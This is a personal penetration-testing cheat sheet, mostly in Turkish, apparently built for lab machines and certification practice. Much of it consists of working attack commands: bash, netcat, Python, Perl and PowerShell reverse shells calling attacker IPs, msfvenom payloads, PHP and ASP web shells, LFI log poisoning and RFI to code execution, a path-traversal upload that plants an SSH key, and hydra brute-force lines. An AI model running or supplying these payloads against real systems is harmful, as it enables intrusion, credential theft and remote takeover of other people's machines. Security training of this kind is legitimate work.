powershell iwr -uri `http://192.168.49.52:5353/last.exe` -O last.exe
kali de
python3 -m http.server

WINDOWSTAN KALIYE DOSYA AKTARMAK

KALİ DE
impacket-smbserver test . -smb2support  -username burak -password burakpassword

WINDOWSTA
PS : >  net use m: \\\\192.168.45.243\\test /user:burak  burakpassword
PS : >  copy test.rar m:\\

not: m burda sürücü harfi, c, d gibi, boşta olan herhangi bir harfi verebilirsin.

LINUXDA DOSYA TRANSFERİ ÖRNEK
wget `http://10.10.10.10/pspy64` -O pspy64

pscp kullanımı
loot dosyasını direkt kendi kaline nasıl indirirsin
pscp Administrator@10.10.192.8:C:/Users/Administrator/Downloads/20250518023415_loot.zip /
veya direkt bulunduğun dizine
loot dosyasını direkt kendi kaline nasıl indirirsin
pscp Administrator@10.10.192.8:C:/Users/Administrator/Downloads/20250518023415_loot.zip .

eğer pscp yüklü değilse
apt-get install putty-tools
```

CURL

```
curl -L `http://192.168.154.65:9998`    içeriği terminalde görüntüler
```

CRACKING

```
Hash analyzer
<https://www.tunnelsup.com/hash-analyzer/>
kalide de hash identifier var
> hash-identifier

================================================================
                     Hash Formatını Tanıma
================================================================
Yöntem 1: Gözle Tanıma (Hash Yapısı)
NTLM     → 32 karakter hex: 5f4dcc3b5aa765d61d8327deb882cf99
NTLMv1   → user::domain:challenge:response:challenge
NTLMv2   → user::domain:...:...:01010000CAFEBABE...
SHA256   → 64 karakter hex
bcrypt   → $2y$, $2a$, $2b$ ile başlar
MD5      → 32 karakter hex

Yöntem 2: Otomatik Tanıma
hashid hash.txt
hash-identifier

================================================================
             Doğru Komutla Kırma (hashcat / john)
================================================================
HASHCAT için
--force bayrağını da ekleyebilirsin, hataları vs gözardı eder.
-O optimized demek, daha hızlı kırar.
=== Saldırı Modları (hashcat -a)
-a 0: Dictionary
-a 3: Brute-force (mask attack)
-a 6: Wordlist + Rules

##KERBEROS
hashcat -m 13100 -a 0 hash.txt /usr/share/wordlists/rockyou.txt

## NTLM
hashcat -m 1000 -a 0 hash.txt /usr/share/wordlists/rockyou.txt

## NTLMv1
hashcat -m 5500 -a 0 hash.txt /usr/share/wordlists/rockyou.txt

## NTLMv2
hashcat -m 5600 -a 0 hash.txt /usr/share/wordlists/rockyou.txt

## SHA256
hashcat -m 1400 -a 0 hash.txt /usr/share/wordlists/rockyou.txt

## bcrypt
hashcat -m 3200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt

## MSSQL 2000
hashcat -m 131 -a 0 hash.txt /usr/share/wordlists/rockyou.txt

## MSSQL 2005+
hashcat -m 132 -a 0 hash.txt /usr/share/wordlists/rockyou.txt

## ZIP şifre kırma
hashcat -m 13600 -a 0 zip.hash /usr/share/wordlists/rockyou.txt

## RAR3 şifre kırma
hashcat -m 12500 -a 0 rar.hash /usr/share/wordlists/rockyou.txt

## 7z şifre kırma
hashcat -m 11600 -a 0 7z.hash /usr/share/wordlists/rockyou.txt

## Shadow (Linux hashleri kırmak)
unshadow passwd shadow > full.txt
john --wordlist=/usr/share/wordlists/rockyou.txt full.txt

================================================================
                             JOHN
================================================================
## Basit kullanım
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

## Format belirterek
john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

## Kırılmışları göster
john --show hash.txt
================================================================
                          FCRACKZIP
================================================================
frackzip -u -D -p /usr/share/wordlists/rockyou.txt decoded.backup
fcrackzip -D -p /usr/share/wordlists/rockyou.txt backup.zip
fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt <FILE>.zip
ilk komut gerçekten unzip yapmaya çalışır, hata oranı daha düşük

================================================================
                   Stego / Gizli Bilgi Çıkarma
================================================================
## binwalk - gömülü dosya çıkarma
binwalk -Me dosya.png --run-as=root

## strings - gizli yazı bulma
strings dosya.png
strings test.exe        # sonuç yok veya az çıktı
strings -e l test.exe   # "Password", "admin", "http://..." gibi şeyler çıkar

## steghide - görsel içine gizlenmiş dosya
steghide extract -sf image.jpg
steghide extract -sf image.jpg -p parola
*exiftool -a -u test.pdf*

================================================================
## gpp-decrypt - GPP şifresi çözme (Windows XML'den)
Bu GPP (Group Policy Preference) şifresidir - aes256 ile şifrelenmiş, kalideki gpp-decrypt kırar
gpp-decrypt eHOwhdfgZLTjt/Qadfsgsdfglksdfglsdkfgdf+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
================================================================

# Base64 decode
echo "cGFzc3dvcmQ=" | base64 -d

# Encode
echo -n "manchester" | sha246sum
d*****************************************

# === Hashcat mod listesi
hashcat --help | grep -i 'Hash-Mode'

# === Önerilen Wordlist
/usr/share/wordlists/rockyou.txt

# Offline - Local
impacket-secretsdump -sam SAM -system SYSTEM LOCAL

# Offline - Domain
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL

# Remote - Password
impacket-secretsdump domain/user:pass@IP

# Remote - Pass-the-Hash
impacket-secretsdump domain/user@IP -hashes LM:NTLM

# Remote - DCSync
impacket-secretsdump domain/user@DC_IP -just-dc

zip dosyasının şifresini kırma
zip2john backup.zip > hash
john hash -w=/usr/share/wordlists/rockyou.txt
7z x backup.zip
```

ARŞİV DOSYALARINI ÇIKARMA - ZIP RAR TAR

```
# TAR Dosyaları
tar -xvf file.tar            # .tar çıkar
tar -xvzf file.tar.gz        # .tar.gz veya .tgz çıkar (gzip sıkıştırmalı)
tar -xvjf file.tar.bz2       # .tar.bz2 çıkar (bzip2 sıkıştırmalı)

# GZ Dosyaları (tek dosya)
gunzip file.gz               # .gz çıkar (tek dosya için)

# ZIP Dosyaları
unzip file.zip               # .zip çıkar
unzip -l file.zip            # .zip içeriğini listele

# Şifreli ZIP (Brute Force ile parola kırma)
fcrackzip -v -u -D -p /usr/share/wordlists/rockyou.txt file.zip

# RAR Dosyaları
unrar x file.rar             # .rar çıkar (x = extract with paths)
unrar l file.rar             # .rar içeriğini listele

# Şifreli RAR (Brute Force ile parola kırma)
rarcrack file.rar --type rar --wordlist /usr/share/wordlists/rockyou.txt

# Gerekirse unrar kur (Debian/Ubuntu)
sudo apt install unrar
```

COMPILE

```
C kodu derleme
gcc test.c -o shell

cpp kodu derleme
sudo apt install mingw-w64
x86_64-w64-mingw32-g++ dosya.cpp -o program.exe

32 bit ortamda c kodu derleme: örnek
i686-w64-mingw32-gcc 40444.c -o win32.exe -lws2_32
```

CONNECTIONS

```
SSH (22)
ssh a belli bir port üzerinden bağlanma
ssh test@10.10.10.10 -p 2222

ssh bağlantısı için özel gereksinimler varsa 
ssh -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedAlgorithms=+ssh-rsa root@192.168.248.39

ssh rsa dosyası ile bağlanma
rsa dosyasına 600 yetkisi verilmiş olmalı --> chmod 600 gibi
ssh -i id_rsa root@10.10.10.10

etkileşimli shell
ssh root@10.10.10.10 -t bash

MYSQL (3306)
Kullanıcı adı ve parola ile
mysql -u root -p

mysql -h <sunucu_ip_adresi> -u <kullanıcı_adı> -p

MYSQLDUMP
mysqldump Magic -u magic -p

RDP CONNECTIONS
nmap -p 3389 --script=rdp-vuln-ms12-020.nse
rdesktop -u username -p password  -r disk:share=/root/ 10.11.1.111
rdesktop -u guest -p guest 10.11.1.111
ncrack -vv --user Administrator -P /root/oscp/passwords.txt rdp://10.11.1.111
xfreerdp /u:bill /p:Password! /v:10.11.1.111

POSTGRESQL
psql -U <myuser> # Open psql console with user
psql -h <host> -U <username> -d <database> # Remote connection
psql -h <host> -p <port> -U <username> -W <database> # Remote connection

\\list # List Databases
\\c postgres # Connect to DB
\\d <table> # List tables

evil-winrm
evil-winrm -i 192.168.1.10 -u kullanici_adi -p 'Parola123!' -d DOMAINADI
evil-winrm -i 192.168.1.10 -u DOMAINADI\\\\kullanici -p 'Parola123!'
evil-winrm -i dc01.test.local -u administrator -p 'P@ssw0rd!' -d CONTOSO

psexec

impacket-psexec Administrator@10.10.10.100
impacket-psexec <Administrator:T1968@10.10.10.100>
impacket-psexec active.htb/Administrator:T8@10.10.10.100
PsExec64.exe \\\\192.168.2.109 -u Administrator -p Passw0rd! cmd.exe

Priv Esc via Postgres

CREATE TABLE cmd(cmd_output text);
COPY cmd FROM PROGRAM 'bash -i >& /dev/tcp/192.168.49.114/80 0>&1';
```

MONGODB CONNECTIONS

```jsx
Mongodb (27017)
mongodb komutları

# === MongoDB Bağlantı Komutları ===

# Anonim bağlantı
mongo
mongo 127.0.0.1:27017

# Kullanıcı ve şifre ile bağlantı
mongo -u <kullanici_adı> -p <şifre> <host>:<port>/<veritabani>
mongo -u admin -p secret123 localhost:27017/scheduler

# URI formatında bağlantı
mongo "mongodb://kullanici:parola@ip:port/veritabani?authSource=admin"
mongo "mongodb://mark:5AYRft73Vpc84k@localhost:27017/scheduler?authSource=admin"

# === MongoDB Shell Komutları ===

# Veritabanlarını ve koleksiyonları listele
show dbs
use scheduler
show collections

# Veri listeleme
db.users.find()
db.users.find().pretty()
db.users.find({ username: "admin" })

# Veri ekleme (örnek)
db.users.insert({ username: "test", pass: "1234" })

# Koleksiyon silme (tehlikeli!)
db.users.drop()

# Kullanıcıları listeleme
db.getUsers()

# Bağlantı durumu
db.runCommand({ connectionStatus: 1 })

# Sunucu durumu
db.serverStatus()

# (Açık varsa) Komut çalıştırma
db.eval('return require("child_process").exec("ls /")')

smb server ile
Oluşturduğumuz reverse shell dosyasını windows makinasına aktarmak için smb server açalım
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .

windows makinasına xfreerdp ile bağlanıp reverse shell dosyasını alalım
copy \\\\10.10.114.104\\kali\\reverse.exe C:\\PrivEsc\\reverse.exe
```

MSSQL CONNECTIONS

```bash
**Windows Authentication (Domain User)**
impacket-mssqlclient'DOMAIN/user':'password'@IP -windows-auth
impacket-mssqlclient'mockexam.local/burak'Starsdfsdft123!'@192.168.94.135 -windows-auth

**Windows Auth – Password Yok (NTLM / Pass-the-Hash**
impacket-mssqlclient DOMAIN/user@IP -windows-auth -hashes :NTLM_HASH
impacket-mssqlclient mockexam.local/burak@192.168.94.135 -windows-auth -hashes :a******************************

**SQL Authentication (Windows Auth yoksa)**
impacket-mssqlclient user:password@IP
 
**Port Belirtme (1433 dışıysa)**
impacket-mssqlclient DOMAIN/user:password@IP -windows-auth -port 14330
 
**Encryption Zorunluysa (TLS hatası alırsan)**
mpacket-mssqlclient DOMAIN/user:password@IP -windows-auth -encrypt 
```

HTTP SERVER AÇMA

```
1. Dosyanın bulunduğu klasöre geç
cd /home/kali/Desktop  # ← reverse.exe, exploit.msi vs burada olsun

2. PYTHON 3 ile HTTP server aç (önerilen)
python3 -m http.server 8000

Alternatif: PYTHON 2 ile HTTP server aç
python2 -m SimpleHTTPServer 8000

NOT: Port 80 kullanacaksan sudo gerekebilir
sudo python3 -m http.server 80

3. WINDOWS MAKİNEDE DOSYAYI İNDİR
certutil -urlcache -f `http://10.10.10.10:8000/reverse.exe` reverse.exe
```

DNS ZONE TRANSFER

```
DNS ZONE TRANSFER 2 farklı şekilde yapılabilir.
aşağıdaki 1. komut için önce nslookup da  target ip çalıştırılır, elde ettiğin ip aşağıdaki komuta geçilir.

1) host -l test.com 10.129.165.192
2) dnsrecon -d test.com -a

diğer yöntem
dig axfr test.local @10.10.10.182
```

INTERACTIVE SHELL

```
Method 1 - Python pty module
python -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'

Method 2 - If you in meterpreter shell, just write
shell

Method 3 
script /dev/null -c bash

Method 4
perl -mpterm -e 'term '

Method5
ruby -e 'exec "/bin/bash"'

Windowsta shell aldın diyelim ama bozuk, whoami falan çalışmıyor, o zaman path değişkenini düzeltmen gerek.
alttaki doğru olan ; ekli olan, ama 2. satırdaki de lab ortamında ne hikmetse çalıştı, ilki olmazsa diğerini denersin
set PATH=%PATH%;C:\\Windows\\System32;C:\\Windows\\System32\\WindowsPowerShell\\v1.0;
set PATH=%PATH%C:\\Windows\\System32;C:\\Windows\\System32\\WindowsPowerShell\\v1.0;

set PATH=%PATH%;C:\Windows\System32;C:\Windows\System32\WindowsPowerShell\v1.0
renkleri görmek için cmde de  --> EG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1 /f
```

```
METERPRETER COMMANDS
```

1. Core Commands:
   help: Lists all available Meterpreter commands or provides help for a specific command.
   background: Backgrounds the current session.
1. System Commands:
   sysinfo: Displays information about the target system, such as os, architecture, etc.
   ps: Lists running processes on the target system.
   shell: Opens a command shell on the target system.
1. File System Commands:
   ls: Lists files and directories on the target system.
   cd: Changes the current working directory.
   download: Downloads a file from the target system.
   upload: Uploads a file to the target system.
1. Networking Commands:
   ipconfig: Displays network configuration information.
   portfwd: Forwards ports on the target system.
   route: Displays or modifies the target’s routing table.
   pivot: Sets up pivoting through the compromised system.
1. Privilege Escalation Commands:
   getsystem: Attempts to elevate privileges to SYSTEM.
   runas: Executes commands with a different user’s privileges.
1. Information Gathering Commands:
   getuid: Displays the current user’s ID.
   getpid: Displays the current process ID.
1. Post-Exploitation Commands:
   migrate: Moves the Meterpreter to another process.
   hashdump: Dumps password hashes from the target system.
1. Scripting and Automation:
   resource: Executes Meterpreter commands from a script file.
   script: Loads Meterpreter scripts for automation.

```
PASSWORD ATTACKS
```

ftp brute force attack
hydra -L ftp_usernames.txt -P ftp_usernames.txt <ftp://192.168.52.46>

rdp password attack - kullanıcı adları dosyadan alınıp parola hepsine uygulanır.
hydra -L /usr/share/dirb/wordlists/others/names.txt -p “supersecure” rdp://192.168.50.202

ssh password attack - kullanıcı adı verilir, parola listeden çekilir.
hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.50.201
muadili crackmapexec ile örnek:
└─$ crackmapexec ssh 10.10.10.10 -u username.txt -p password.txt

Kullanıcı adı sabit, parola dosyadan
hydra -l george -P /usr/share/wordlists/rockyou.txt ssh://192.168.50.201
hydra -l george -P /usr/share/wordlists/rockyou.txt rdp://192.168.50.202

Parola sabit, kullanıcı adı dosyadan
hydra -L /usr/share/wordlists/users.txt -p “SuperSecret123” ssh://192.168.50.201
hydra -L /usr/share/wordlists/users.txt -p “SuperSecret123” rdp://192.168.50.202

Hem kullanıcı adı hem parola dosyadan
hydra -L /users.txt -P /passwords.txt ssh://192.168.50.201
hydra -L /users.txt -P /passwords.txt rdp://192.168.50.202

Eğer farklı port üzerinden denenmek istenirse -s parametresi eklenerek port belirtilir.
hydra -L /users.txt -P /passwords.txt -s 3333 ssh://192.168.50.201
hydra -L /users.txt -P /passwords.txt -s 3333 rdp://192.168.50.202

rdp için ncrack daha stabildir.
ncrack -p 3389 -u george -P /usr/share/wordlists/rockyou.txt 192.168.50.202

Notlar:

- l → Tek kullanıcı
- L → Kullanıcı adı listesi
- p → Tek parola
- P → Parola listesi
- SSH için port değiştirmek istersen s PORT ekle (örneğin s 2222)
- RDP brute-force yavaş çalışır, xfreerdp veya GUI alternatifleri hız testi için daha uygundur

Login form dictionary attacks!
hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.200
http-post-form “/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid”

hata mesajını ^PASS^ bu ifadeden sonra koyduğun : dan sonra vermeli ve “ ile kapatmalısın.

diğer bir örnek
hydra -l admin -p /usr/share/wordlists/rockyou.txt nineveh.htb https-post-form “/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Login=Incorrect password.”
hydra -l ‘admin’ -P /usr/share/worlists/rockyou.txt nineveh.htb http-post-form ‘department/login.php:username^USER^&password=^PASS^&Login=Login:Invalid Password’
hydra -V -I -l sunny -P ‘/usr/share/wordlists/rockyou.txt’ 10.129.32.188 ssh -s 22022

Parametre	Açıklama
-V	Verbose mod: Denenen her kullanıcı/şifre kombinasyonunu gösterir.
-I	Instant mod: Her başarılı bulguyu anında gösterir (ara bellekte tutmadan).
-s 22022	SSH servisi standart 22 portu yerine 22022 portunda çalışıyor

```
WORDLISTS
```

PASSWORD
/usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt ftp için
/usr/share/wordlists/rockyou.txt.gz  –> Bunu gunzip ile çıkartman lazım
/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.tx

USERNAMES
/usr/share/seclists/Usernames/

SQLI
/home/kali/Downloads/SecLists/Fuzzing/Databases/SQLi

LFI
/home/kali/Downloads/SecLists/Fuzzing/LFI

WEB DIRECTORY FUZZ
/home/kali/Downloads/SecLists/Discovery/Web-Content
directory-list-1.0.txt                   directory-list-2.3-small.txt             directory-list-lowercase-2.3-small.txt
directory-list-2.3-big.txt               directory-list-lowercase-2.3-big.txt
directory-list-2.3-medium.txt            directory-list-lowercase-2.3-medium.txt

API FUZZ
/home/kali/Downloads/SecLists/Discovery/Web-Content/api

```
**WEB ATTACKS**

REVERSE SHELLS
```

Bash reverse shell
; /bin/bash -c “/bin/bash -i >& /dev/tcp/10.10.14.94/443 0>&1”

/bin/bash -c ‘rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.122.1 1234 >/tmp/f’

# Daha stabil versiyon (bash yerine sh kullan)

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.122.1 1234>/tmp/f
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.45.219 443 >/tmp/f

/bin/sh    → Minimal shell, her sistemde var
/bin/bash  → Daha gelişmiş, her sistemde olmayabilir

# Timeout ile (pipe kapanmasın diye)

/bin/bash -c ‘rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.122.1 1234>/tmp/f 2>/tmp/f &’

echo ‘bash -c “bash -i >& /dev/tcp/192.168.45.219/4444 0>&1”’ > shell.sh

Php command injection

<?php echo system($_REQUEST ["cmd"]); ?>

Python bash reverse shell
echo “os.system(‘nc -e /bin/bash 10.10.14.66 5555’)” >> /opt/tmp.py

python reverse shells
Pure python reverse shells - aşağıdaki 2
python3 -c “import socket,os,pty;s=socket.socket();s.connect((\“192.168.45.221\”,80));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn(\”/bin/sh\”)”    —> bunu kullanabilirsin
python -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“10.0.0.1”,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([”/bin/sh”,”-i”]);’

Url encoded
python%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%2210.10.14.77%22,1234));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/sh%22,%22-i%22]);%27

Dosya oluşturma reverse.py
echo -e ‘import socket,subprocess,os\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\ns.connect((“10.10.14.162”,6666))\nos.dup2(s.fileno(),0)\nos.dup2(s.fileno(),1)\nos.dup2(s.fileno(),2)\np=subprocess.call([”/bin/sh”,”-i”])’ > reverse.py

php reverse shell
<https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php>

cmd.asp reverse shell

<%
Set rs = CreateObject(“WScript.Shell”)
Set cmd = rs.Exec(“cmd /c whoami”)
o = cmd.StdOut.Readall()
Response.write(o)
%>

psql ile reverse shell
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM ‘id’;
SELECT * FROM cmd_exec;
COPY cmd_exec FROM PROGRAM ‘rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.5.111 443 >/tmp/f’;

MSFVENOM

1. Windows Reverse TCP Shell (ASPX)
   msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.9 LPORT=4444 -f aspx -o reverse-shell.aspx
1. Windows Reverse TCP Shell (EXE)
   msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.9 LPORT=4444 -f exe -o reverse-shell.exe
1. Linux Reverse TCP Shell (ELF)
   msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.14.9 LPORT=4444 -f elf -o reverse-shell.elf - elf linuxun çalıştırılabilir dosya formatı
1. PHP Reverse Shell
   msfvenom -p php/reverse_php LHOST=10.10.14.9 LPORT=4444 -f raw -o reverse-shell.php
1. Python Reverse Shell Payload (raw)
   msfvenom -p python/reverse_tcp LHOST=10.10.14.9 LPORT=4444 -f raw -o reverse-shell.py
1. Bash Reverse Shell (command injection için)
   msfvenom -p cmd/unix/reverse_bash LHOST=10.10.14.9 LPORT=4444 -f raw
1. war dosyası ile reverse shell
   msfvenom -p java/shell_reverse_tcp LHOST=192.168.45.201 LPORT=443 -f war -o shell.war
1. powershell reverse shell

```powershell
$LHOST = "192.168.49.52"; $LPORT = 5555; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write("$Output`n"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()
```

1. Bash üzerinden reverse shell

└─$ msfvenom -p cmd/unix/reverse_bash LHOST=10.10.10.10 LPORT=443 -f raw -o shell.sh
msfvenom -p cmd/unix/reverse_bash LHOST=10.10.10.10 LPORT=443 -f raw > shell.sh

1. perl reverse shell
   perl -e ‘use Socket;$i=“192.168.45.186”;$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(“tcp”));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,”>&S”);open(STDOUT,”>&S”);open(STDERR,”>&S”);exec(”/bin/sh -i”);};’

```
cmdasp.asp/aspx önemli

┌──(root㉿kali)-[~]
└─# locate cmdasp.asp                      
/usr/share/webshells/asp/cmdasp.asp
/usr/share/webshells/aspx/cmdasp.aspx
```

msfvenom -p windows/x64/shell_reverse_tcp LHOST:10.10.14.21 LPORT=1938 -f exe -o reverseshell.exe

```
LFI
```

Example: test.com/phpnotes=files/testnotes.txt/../../../etc/passwd

lfi to rce:
test.com/phpnotes?notes=/testnotes/../var/tmp/hack.php&cmd=rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2%3E%261|nc+10.10.14.42+3333+%3E/tmp/f
nc -nlvp 3333

LFI ile Dosya Okuma
`http://target.com/page.php?file=../../../../etc/passwd`

LFI ile Log Dosyasına Komut Enjeksiyonu (Linux)
GET /page.php?file=../../../../var/log/apache2/access.log
User-Agent: <?php system($_GET['cmd']); ?>

sonra
`http://target.com/page.php?file=../../../../var/log/apache2/access.log&cmd=whoami`

LFI + php://input Kullanarak RCE (PHP)
`http://target.com/page.php?file=php://input`
POST isteğiyle PHP kodu gönderilir:

<?php system($_GET['cmd']); ?>

LFI ile Komut Enjeksiyonu (cmd parametresi varsa)
`http://target.com/page.php?file=somefile.php&cmd=whoami`

tomcat lfi
../../../usr/share/tomcat9/etc/tomcat-users.xml

```
RFI
```

Saldırgan şu şekilde bir istek gönderirse:
`http://victim.com/vuln.php?page=http://evil.com/shell.txt`

Ve shell.txt içinde şu kod varsa:

<?php system($_GET['cmd']); ?>

Sunucu bu dosyayı indirir ve çalıştırır. Artık saldırgan cmd parametresiyle komut çalıştırabilir:
`http://victim.com/vuln.php?page=http://evil.com/shell.txt&cmd=ls`

curl “`http://test.com/test/index.php?page=http://192.168.119.3/simple-backdoor.php&cmd=ls`”

örnek case :
`http://192.168.66.66:4444/test/index.php?page=https://raw.githubusercontent.com/tburakdirlik/Pentest-Notes/refs/heads/main/r.php`

```
FILE UPLOAD - file upload ile reverse shell almaya çalışırken dosya yolu önemli 
```

CASE 1  -

1. SSH Key Çifti Oluşturuluyor
   ssh-keygen
   fileup adında bir özel anahtar (private key) ve fileup.pub adında bir public key üretiliyor. Bu, saldırganın oturum açabilmesi için gerekli anahtardır.
1. Public Key → authorized_keys Biçiminde Hazırlanıyor
   cat fileup.pub > authorized_keys
   Public key, authorized_keys dosya biçiminde hazırlanıyor.
   Bu dosya daha sonra hedefin ~/.ssh/authorized_keys dizinine yüklenmeye çalışılacak
1. File Upload Zafiyeti Kullanılıyor
   POST /upload HTTP/1.1
   Content-Disposition: form-data; name=“myFile”; filename=”../../../../../../../../../root/.ssh/authorized_keys”

- Burada dikkat: `filename=../../../../../../../../../root/.ssh/authorized_keys`
- Bu, **path traversal** zafiyetidir.
- Sunucu dosya yolunu düzgün filtrelemiyorsa, bu istek gerçekten root kullanıcının authorized_keys dosyasını değiştirir.
- İçeriğe bakarsan, public key ekleniyor:
  ssh-rsa AAAAB3Nz…kali@kali

1. SSH ile Root olarak Bağlanılıyor
   Gerekirse eski anahtar hatası olmasın diye bilinen anahtarlar siliniyor.
   rm ~/.ssh/known_hosts
   ssh -p 2222 -i fileup [root@test.com](mailto:root@test.com)

-p 2222: SSH portu 2222
-i fileup: Daha önce oluşturulan private key kullanılıyor.
Artık, `.ssh/authorized_keys` dosyasına senin key’in yerleştirildiği için parola sormadan `root` olarak içeri giriyorsun.

İSTEK KISMINI DA İÇEREK ŞEKİLDE TEKRAR ÖZETLEYELİM

# kali@kali:~$ssh-keygen
kali@kali:~$cat fileup.pub > authorized_keys

POST /upload HTTP/1.1
Host: test.com:8000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=—————————
Content-Length: 806
Origin: `http://test.com:8000`
Connection: close
Referer: `http://test.com:8000/`
Upgrade-Insecure-Requests: 1

-----

Content-Disposition: form-data; name=“myFile”; filename=”../../../../../../../../../root/.ssh/authorized_keys”
Content-Type: application/octet-stream

ssh-rsa rsahere______________________+c…….kali@kali

=============================================================================================================================================================================
kali@kali:~$rm ~/.ssh/known_hosts
kali@kali:~$ssh -p 2222 -i fileup [root@test.com](mailto:root@test.com)
root@kali:~#

CASE 2

dosya yüklerken isteği tut filename kısmını
file.png.php yap
dosya içeriği

<?php echo shell_exec($_GET['cmd']); ?>

sonra dosyayı çağırırken şu yöntemi kullan
http://……6.php?cmd=id
burdan response dönerse komut çalıştırabiliyorsun demektir.
sonrası reverse shell
`http://test.com/upload/ff6.php?cmd=python%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%2210.10.14.77%22,1234)`);os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/sh%22,%22-i%22]);%27
netcat açıp urlyi çalıştır shell düşecektir.

CASE 3

reverseshell.php5

<?php system($_REQUEST['cmd']); ?>

10.10.10.109/uploads/reverseshell.php5?cmd=id
burdan sonrası reverseshellpayload
curl -s ‘`http://10.10.10.109/uploads/reverseshell.php5?cmd=rm%20/tmp/f;mkfifo%20/tmp/f;cat%20/tmp/f|/bin/sh%20-i%202%3E%261|nc%2010.10.14.9%20777%20%3E/tmp/f`’
netcat açıılır shell düşer

CASE 4

exiftool -Comment=’<?php system($_REQUEST['cmd']); ?>’ shell.png
mv shell.png shell.php.png
dosya yüklenir, sonrası reverse shell

`http://10.10.10.185/images/uploads/shell.php.png?cmd=python3%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%2210.10.14.17%22,5555)`);os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/sh%22,%22-i%22]);%27

CASE 5: Dosya yükleme alanı varsa ama hangi tipte dosyanın yükleneceği bilinmiyorsa dosya yüklerken dosya tipine brute force atabilirsin.

case 6: .htaccess - file upload reverse shell and shell

Kullanıcıların .htaccess dosyaları yükleyebildiğini fark ettik. Bunu kod yürütme elde etmek için kullanabiliriz.
.htaccess dosyası kendi başına bir uzaktan kod yürütme (RCE) vektörü değildir, ancak yeni ve meşru PHP eklentilerinin oluşturulmasına olanak tanır.
gobuster dir -u `http://192.168.120.107` -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

echo “AddType application/x-httpd-php .xyz” > .htaccess
cp php_cmd.php  /home/kali/Desktop/php_cmd.xyz
dosyayı yükle

`http://access.offsec/uploads/php_cmd.xyz?cmd=whoami`
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.192 LPORT=4444 -f exe -o reverse-shelloffsec.exe
nc -nlvp 4444
`http://mock.exam/uploads/php_cmd.xyz?cmd=reverse-shelloffsec.exe`

shell elde edilir.

dier yol
HTTP BODY - .htaccess dosyası yüklenir

Content-Disposition: form-data; name=“the_file”; filename=”.htaccess”
Content-Type: text/plain
AddType application/x-httpd-php .evil

sonra içine php reverse shell konularak reverse shell eklenir.
sonra url sonu test.evil?cmd=id

```
```go
file uplaod bypass 
shell.php 

GIF87a
<?php system($_GET['cmd']); ?>

-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
ASP WEB SHELL   cmd.asp    kullanım önreği cmd.asp?cmd=id

<%
